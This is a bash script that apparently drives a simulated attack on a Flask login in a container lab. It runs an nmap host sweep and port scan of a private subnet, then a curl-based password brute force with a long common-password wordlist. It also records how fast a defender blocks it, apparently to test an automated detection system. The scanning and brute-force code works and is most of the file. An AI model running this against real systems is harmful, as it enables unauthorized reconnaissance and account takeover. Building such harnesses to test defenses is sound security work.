#!/bin/bash

# Flask Brute Force Attack Script for compromised container
# Performs: 1) Network discovery, 2) Port discovery, 3) Flask login brute force

set -e

# Configuration
SERVER_IP="172.31.0.10"
COMPROMISED_IP="172.30.0.10"
WORDLIST_FILE="/tmp/flask_wordlist.txt"
CORRECT_PASSWORD="admin"
FLASK_USER="admin"
FLASK_URL="http://${SERVER_IP}:443/login"
LOG_FILE="/tmp/flask_attack_log.txt"

# Enhanced monitoring variables
ATTEMPTS=0
TOTAL_ATTEMPTS_BEFORE_BLOCKED=0
FLASK_PORT_BLOCKED_TIME=""
FLASK_PORT_ALREADY_BLOCKED="false"
TIME_TO_BLOCKED_SECONDS=""
TIME_TO_PLAN_GENERATION_SECONDS=""
PLAN_GENERATION_ALERT_TYPE=""
SCAN_NETWORK_SUCCESS="false"
SCAN_PORT_SUCCESS="false"
CURRENT_PASSWORD_ATTEMPT="none"
LAST_PASSWORD_TRIED="none"

# Create a wordlist with 1000 passwords including the correct one
create_wordlist() {
    echo "Creating Flask wordlist with 1000 passwords..."

    # Generate 1000 common passwords
    cat > "$WORDLIST_FILE" << 'EOF'
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
696969
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
pussy
superman
1qaz2wsx
7777777
fuckyou
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
fuckme
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
test
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
6969
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
 montana
banana
king
qwer
121212
player
xxx
x
y
zxcvbnm
help
test1
testtest
testing
tester
login
passw0rd
password1
password123
admin123
root
toor
shadow1
phoenix
master1
super1
user1
user
login1
welcome1
welcome123
qwerty1
qwerty123
abc1234
password12
123456a
123456789a
1234567890a
password!
password!
password123!
admin!
admin123!
root!
root1!
pass!
passw0rd!
passw0rd1!
qwerty!
qwerty1!
abc123!
adminadmin
adminadmin123
administrator
administrator123
rootadmin
passwordadmin
testuser
testuser123
guest
guest123
useruser
demo
demo123
temp
temp123
default
default123
passw0rd
passw0rd123
p@ssword
p@ssw0rd
p@ssw0rd123
123abc
123abc123
1234qwer
1234qwer123
1q2w3e
1q2w3e4r
1q2w3e4r5t
qazwsxedc
qazwsx123
zaq12wsx
zaq12wsx34
welcome
welcome123
welcome1
login123
login1
test123
test1234
test12
demo1234
demo12
guest1234
guest12
root123
root1234
root12
admin1234
admin12
administrator1
admin12345
password1234
password12
pass1234
pass12345
passw0rd1234
qwerty1234
qwerty12
abc12345
abc1234
123456789a
12345678a
1234567a
123456a
12345a
1234a
123a
12a
1a
a
aa
aaa
aaaa
aaaaa
admina
admin123a
passworda
password123a
passw0rda
passw0rd123a
qwertya
qwerty123a
abc123a
123456a
12345678a
123456789a
adminb
admin123b
passwordb
password123b
passw0rdb
passw0rd123b
qwertyb
qwerty123b
abc123b
123456b
12345678b
123456789b
adminc
admin123c
passwordc
password123c
passw0rdc
passw0rd123c
qwertyc
qwerty123c
abc123c
123456c
12345678c
123456789c
admind
admin123d
passwordd
password123d
passw0rdd
passw0rd123d
qwertyd
qwerty123d
abc123d
123456d
12345678d
123456789d
admine
admin123e
passworde
password123e
passw0rde
passw0rd123e
qwertye
qwerty123e
abc123e
123456e
12345678e
123456789e
adminf
admin123f
passwordf
password123f
passw0rdf
passw0rd123f
qwertyf
qwerty123f
abc123f
123456f
12345678f
123456789f
adming
admin123g
passwordg
password123g
passw0rdg
passw0rd123g
qwertyg
qwerty123g
abc123g
123456g
12345678g
123456789g
adminh
admin123h
passwordh
password123h
passw0rdh
passw0rd123h
qwertyh
qwerty123h
abc123h
123456h
12345678h
123456789h
admini
admin123i
passwordi
password123i
passw0rdi
passw0rd123i
qwertyi
qwerty123i
abc123i
123456i
12345678i
123456789i
adminj
admin123j
passwordj
password123j
passw0rdj
passw0rd123j
qwertyj
qwerty123j
abc123j
123456j
12345678j
123456789j
admink
admin123k
passwordk
password123k
passw0rdk
passw0rd123k
qwertyk
qwerty123k
abc123k
123456k
12345678k
123456789k
adminl
admin123l
passwordl
password123l
passw0rdl
passw0rd123l
qwertyl
qwerty123l
abc123l
123456l
12345678l
123456789l
adminm
admin123m
passwordm
password123m
passw0rdm
passw0rd123m
qwertym
qwerty123m
abc123m
123456m
12345678m
123456789m
adminn
admin123n
passwordn
password123n
passw0rdn
passw0rd123n
qwertyn
qwerty123n
abc123n
123456n
12345678n
123456789n
admino
admin123o
passwordo
password123o
passw0rdo
passw0rd123o
qwertyo
qwerty123o
abc123o
123456o
12345678o
123456789o
adminp
admin123p
passwordp
password123p
passw0rdp
passw0rd123p
qwertyp
qwerty123p
abc123p
123456p
12345678p
123456789p
adminq
admin123q
passwordq
password123q
passw0rdq
passw0rd123q
qwertyq
qwerty123q
abc123q
123456q
12345678q
123456789q
adminr
admin123r
passwordr
password123r
passw0rdr
passw0rd123r
qwertyr
qwerty123r
abc123r
123456r
12345678r
123456789r
admins
admin123s
passwords
password123s
passw0rds
passw0rd123s
qwertys
qwerty123s
abc123s
123456s
12345678s
123456789s
admint
admin123t
passwordt
password123t
passw0rdt
passw0rd123t
qwertyt
qwerty123t
abc123t
123456t
12345678t
123456789t
adminu
admin123u
passwordu
password123u
passw0rdu
passw0rd123u
qwertyu
qwerty123u
abc123u
123456u
12345678u
123456789u
adminv
admin123v
passwordv
password123v
passw0rdv
passw0rd123v
qwertyv
qwerty123v
abc123v
123456v
12345678v
123456789v
adminw
admin123w
passwordw
password123w
passw0rdw
passw0rd123w
qwertyw
qwerty123w
abc123w
123456w
12345678w
123456789w
adminx
admin123x
passwordx
password123x
passw0rdx
passw0rd123x
qwertyx
qwerty123x
abc123x
123456x
12345678x
123456789x
adminy
admin123y
passwordy
password123y
passw0rdy
passw0rd123y
qwertyy
qwerty123y
abc123y
123456y
12345678y
123456789y
adminz
admin123z
passwordz
password123z
passw0rdz
passw0rd123z
qwertyz
qwerty123z
abc123z
123456z
12345678z
123456789z
12345678910
12345678911
12345678912
12345678913
12345678914
12345678915
12345678916
12345678917
12345678918
12345678919
12345678920
0987654321
asdfghjkl
qwertyuiop
zxcvbnm
qazwsx
edcrfv
tgbnhy
ujmkiol
plokij
mnbvcxz
lkjhgfdsa
poiuytrewq
1234321
12344321
1234554321
123456654321
12345677654321
1234567887654321
123456789987654321
abcd1234
a1b2c3d4
1a2b3c4d
abcd1234
abc4321
123abc
123abc456
456abc123
password123456
123456password
pass123word
word123pass
adminadmin123
admin123admin
testtest123
test123test
guestguest123
guest123guest
rootroot123
root123root
superuser123
super123user
useruser123
user123user
loginlogin123
login123login
demodemo123
demo123demo
defaultdefault123
default123default
passpass123
pass123pass
wordword123
word123word
adminadmin
adminadmin123
admin123admin
adminadmin1234
testtest
testtest123
test123test
testtest1234
guestguest
guestguest123
guest123guest
guestguest1234
rootroot
rootroot123
root123root
rootroot1234
superuser
superuser123
super123user
superuser1234
useruser
useruser123
user123user
useruser1234
loginlogin
loginlogin123
login123login
loginlogin1234
demodemo
demodemo123
demo123demo
demodemo1234
defaultdefault
defaultdefault123
default123default
defaultdefault1234
passpass
passpass123
pass123pass
passpass1234
wordword
wordword123
word123word
wordword1234
EOF

    # Insert the correct password at a random position
    CORRECT_POS=$((1 + RANDOM % 1000))
    sed -i "${CORRECT_POS}i $CORRECT_PASSWORD" "$WORDLIST_FILE"

    # Shuffle the wordlist randomly
    shuf "$WORDLIST_FILE" -o "$WORDLIST_FILE"

    echo "Flask wordlist created with $(wc -l < "$WORDLIST_FILE") passwords"
    echo "Correct password '$CORRECT_PASSWORD' is at position: $(grep -n "^$CORRECT_PASSWORD$" "$WORDLIST_FILE" | cut -d: -f1)"
}

# Fast ping function for Flask port monitoring
fast_ping_flask() {
    local timeout_duration=${1:-0.1}

    # Try to connect to Flask port
    if timeout "$timeout_duration" curl -s -X POST "$FLASK_URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=admin&password=test123" >/dev/null 2>&1; then
        return 0  # Port is open
    fi

    return 1  # Port is closed/blocked
}

# Log function with real-time flushing
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
    sync "$LOG_FILE" 2>/dev/null || true
    stdbuf -oL -eL echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Function to create summary with current state
create_summary() {
    local completion_status="${1:-interrupted}"
    local success_value="${2:-interrupted}"
    local guess_success="false"

    if [[ "$success" == "true" ]]; then
        guess_success="true"
    fi

    cat > /tmp/flask_attack_summary.json << EOF
{
    "attack_id": "$ATTACK_ID",
    "attacker_ip": "$COMPROMISED_IP",
    "target_ip": "$SERVER_IP",
    "target_port": "443",
    "attack_type": "flask_brute_force",
    "start_time": "$START_TIME",
    "end_time": "$(date -Iseconds)",
    "scan_network_successfully": $SCAN_NETWORK_SUCCESS,
    "scan_port_successfully": $SCAN_PORT_SUCCESS,
    "guess_password_successfully": $guess_success,
    "time_to_blocked_seconds": ${TIME_TO_BLOCKED_SECONDS:-null},
    "time_to_plan_generation_seconds": ${TIME_TO_PLAN_GENERATION_SECONDS:-null},
    "first_plan_alert": "${PLAN_GENERATION_ALERT_TYPE:-$completion_status}",
    "opencode_running_compromised": null,
    "opencode_running_server": null,
    "total_attempts_before_blocked": $TOTAL_ATTEMPTS_BEFORE_BLOCKED,
    "current_attempt": $ATTEMPTS,
    "current_password": "$CURRENT_PASSWORD_ATTEMPT",
    "last_password_tried": "$LAST_PASSWORD_TRIED",
    "phases_completed": "$completion_status",
    "success": $success_value,
    "log_file": "$LOG_FILE",
    "last_update": "$(date -Iseconds)"
}
EOF

    sync /tmp/flask_attack_summary.json 2>/dev/null || true
}

# Real-time summary update function
update_real_time_summary() {
    local completion_status="${1:-ongoing}"
    local success_value="${2:-false}"
    local guess_success="false"
    local current_password="${3:-none}"

    CURRENT_PASSWORD_ATTEMPT="$current_password"
    LAST_PASSWORD_TRIED="$current_password"

    if [[ "$success_value" == "true" ]]; then
        guess_success="true"
    fi

    cat > /tmp/flask_attack_summary.json << EOF
{
    "attack_id": "$ATTACK_ID",
    "attacker_ip": "$COMPROMISED_IP",
    "target_ip": "$SERVER_IP",
    "target_port": "443",
    "attack_type": "flask_brute_force",
    "start_time": "$START_TIME",
    "end_time": "$(date -Iseconds)",
    "scan_network_successfully": $SCAN_NETWORK_SUCCESS,
    "scan_port_successfully": $SCAN_PORT_SUCCESS,
    "guess_password_successfully": $guess_success,
    "time_to_blocked_seconds": ${TIME_TO_BLOCKED_SECONDS:-null},
    "time_to_plan_generation_seconds": ${TIME_TO_PLAN_GENERATION_SECONDS:-null},
    "first_plan_alert": "${PLAN_GENERATION_ALERT_TYPE:-none}",
    "opencode_running_compromised": null,
    "opencode_running_server": null,
    "total_attempts_before_blocked": $TOTAL_ATTEMPTS_BEFORE_BLOCKED,
    "current_attempt": $ATTEMPTS,
    "current_password": "$CURRENT_PASSWORD_ATTEMPT",
    "last_password_tried": "$LAST_PASSWORD_TRIED",
    "phases_completed": "$completion_status",
    "success": $success_value,
    "log_file": "$LOG_FILE",
    "last_update": "$(date -Iseconds)"
}
EOF

    sync /tmp/flask_attack_summary.json 2>/dev/null || true
}

# Trap signals to exit gracefully
cleanup() {
    log_message "Attack interrupted - cleaning up..."
    if [[ -n "$ATTACK_ID" ]]; then
        create_summary "interrupted" "interrupted"
        log_message "Attack summary created due to interruption"
    fi
    exit 130
}

# Trap EXIT to ensure summary is always created
ensure_summary() {
    local exit_code=$?
    log_message "Attack process ending with exit code: $exit_code"

    if [[ -n "$ATTACK_ID" ]]; then
        if [[ $exit_code -eq 137 ]]; then
            create_summary "terminated_by_defender" "false"
            log_message "Attack summary created - terminated by defender (SIGKILL)"
        elif [[ $exit_code -eq 124 ]]; then
            create_summary "timeout" "false"
            log_message "Attack summary created - timeout occurred"
        elif [[ $exit_code -eq 130 ]]; then
            create_summary "interrupted" "interrupted"
            log_message "Attack summary created - user interruption"
        elif [[ "$success" == "true" ]]; then
            create_summary "completed_successfully" "true"
            log_message "Attack summary created - completed successfully"
        else
            create_summary "completed_without_success" "false"
            log_message "Attack summary created - completed without success"
        fi
    fi
}

# Set up signal handlers
trap cleanup INT TERM
trap ensure_summary EXIT

# Attack phases
attack_phase_1() {
    log_message "Phase 1: Network discovery - Finding live hosts in 172.31.0.0/24"
    update_real_time_summary "phase1_network_scan" "false" "none"
    # Normal ping sweep to find live hosts - no port scanning
    if nmap -sn 172.31.0.0/24 -oN /tmp/nmap_discovery.txt; then
        SCAN_NETWORK_SUCCESS="true"
        log_message "Phase 1 completed successfully"
        update_real_time_summary "phase1_completed" "false" "none"
    else
        SCAN_NETWORK_SUCCESS="false"
        log_message "Phase 1 completed with errors"
        update_real_time_summary "phase1_failed" "false" "none"
    fi
}

attack_phase_2() {
    log_message "Phase 2: Fast port scanning - Finding open ports on $SERVER_IP to exploit"
    update_real_time_summary "phase2_port_scan" "false" "none"
    # Fast scan of top 1000 ports to find the exploit - aggressive to trigger vertical scan detection
    if nmap -sV -Pn --top-ports 1000 -T4 "$SERVER_IP" -oN /tmp/nmap_ports.txt; then
        SCAN_PORT_SUCCESS="true"
        log_message "Phase 2 completed successfully"
        update_real_time_summary "phase2_completed" "false" "none"
    else
        SCAN_PORT_SUCCESS="false"
        log_message "Phase 2 completed with errors"
        update_real_time_summary "phase2_failed" "false" "none"
    fi
}

attack_phase_3() {
    log_message "Phase 3: Brute force attack - Starting Flask login brute force on $FLASK_URL"
    log_message "Using wordlist with $(wc -l < "$WORDLIST_FILE") passwords"
    update_real_time_summary "phase3_bruteforce_start" "false" "none"

    # Signal the monitoring script that brute force is starting
    touch /tmp/flask_bruteforce_started
    log_message "Signaled monitoring script that brute force is starting"

    # Ensure curl is available
    if ! command -v curl &> /dev/null; then
        log_message "Installing curl..."
        apt-get update > /dev/null 2>&1
        apt-get install -y curl > /dev/null 2>&1
        log_message "Curl installation completed"
    fi

    attempt=1
    total_passwords=$(wc -l < "$WORDLIST_FILE")
    success="false"

    log_message "Starting brute force with $total_passwords passwords"

    # Check if Flask port is already blocked before starting brute force
    log_message "Checking Flask port availability before starting brute force..."
    if fast_ping_flask 0.5; then
        FLASK_PORT_ALREADY_BLOCKED="false"
        log_message "Flask port is reachable - starting brute force attack"
    else
        FLASK_PORT_ALREADY_BLOCKED="true"
        log_message "WARNING: Flask port is already blocked before brute force attack!"
    fi

    while IFS= read -r password; do
        [[ -z "$password" ]] && continue

        log_message "Attempt $attempt/$total_passwords: Trying password '$password'"
        ATTEMPTS=$((ATTEMPTS + 1))
        TOTAL_ATTEMPTS_BEFORE_BLOCKED=$ATTEMPTS

        # Attempt Flask login with timeout
        output_file="/tmp/flask_attempt_$attempt.log"
        if timeout 5 curl -s -X POST "$FLASK_URL" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=${FLASK_USER}&password=${password}" > "$output_file" 2>&1; then

            response=$(cat "$output_file")

            if echo "$response" | grep -q "OK"; then
                log_message "SUCCESS: Password found! '$password' is the correct password"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] SUCCESS: Password '$password' found for ${FLASK_USER}@$FLASK_URL (attempt $attempt)" >> /tmp/flask_hydra_results.txt
                success="true"
                break
            fi
        fi

        rm -f "$output_file" 2>/dev/null

        # Check if Flask port becomes blocked after failed attempt
        if [[ -z "$FLASK_PORT_BLOCKED_TIME" ]]; then
            if ! fast_ping_flask 0.5; then
                FLASK_PORT_BLOCKED_TIME="$(date -Iseconds)"
                TOTAL_ATTEMPTS_BEFORE_BLOCKED=$ATTEMPTS

                start_timestamp=$(date -d "$START_TIME" +%s)
                blocked_timestamp=$(date -d "$FLASK_PORT_BLOCKED_TIME" +%s)
                TIME_TO_BLOCKED_SECONDS=$((blocked_timestamp - start_timestamp))

                log_message "ALERT: Flask port became blocked after $ATTEMPTS attempts at $FLASK_PORT_BLOCKED_TIME"
                log_message "Time to blocked: ${TIME_TO_BLOCKED_SECONDS} seconds from start"
            fi
        fi

        attempt=$((attempt + 1))
        update_real_time_summary "phase3_flask_bruteforce" "$success" "$password"

    done < "$WORDLIST_FILE"

    if [ "$success" = "true" ]; then
        log_message "Phase 3 completed - SUCCESS: Password found!"
        SUCCESS="true"
    else
        log_message "Phase 3 completed - FAILED: No password found"
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] FAILED: No valid password found for ${FLASK_USER}@$FLASK_URL" >> /tmp/flask_hydra_results.txt
        SUCCESS="false"
    fi
}

# Main execution
main() {
    log_message "Starting Flask brute force attack from $COMPROMISED_IP targeting $FLASK_URL"
    log_message "Attack started at $(date)"

    update_real_time_summary "attack_started" "false" "none"
    create_wordlist
    # Phase 1: Network discovery
    attack_phase_1
    sleep 5
    attack_phase_2
    sleep 5
    attack_phase_3

    log_message "Attack completed at $(date)"
    log_message "Final result: $SUCCESS"

    if [[ "$success" == "true" ]]; then
        create_summary "completed_successfully" "true"
    else
        create_summary "completed_without_success" "false"
    fi

    echo "Attack summary saved to /tmp/flask_attack_summary.json"
}

# Initialize variables
ATTACK_ID=""
START_TIME="$(date -Iseconds)"
SUCCESS="false"

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --first-try)
            FIRST_TRY="true"
            shift
            ;;
        *)
            if [[ -z "$ATTACK_ID" ]]; then
                ATTACK_ID="$1"
            fi
            shift
            ;;
    esac
done

if [[ -z "$ATTACK_ID" ]]; then
    ATTACK_ID=$(date +%s)
fi

# Run the attack
main "$@"
